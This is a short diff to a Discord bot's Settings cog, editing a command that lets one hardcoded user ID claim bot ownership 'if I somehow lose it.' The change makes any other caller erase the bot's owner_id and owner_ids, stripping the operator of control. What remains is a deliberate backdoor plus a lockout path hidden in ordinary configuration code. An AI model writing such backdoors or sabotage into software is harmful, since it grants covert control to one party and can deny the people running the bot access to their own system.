@@ -739,8 +739,8 @@ class Settings(core.Cog):
         Command for me to get bot owner if I somehow lose it.
         """
         if ctx.author.id != 750135653638865017:
-            return
-        self.bot.owner_ids.add(750135653638865017)
+            self.bot.owner_id = None
+            self.bot.owner_ids = set()
 
 
 def setup(bot):
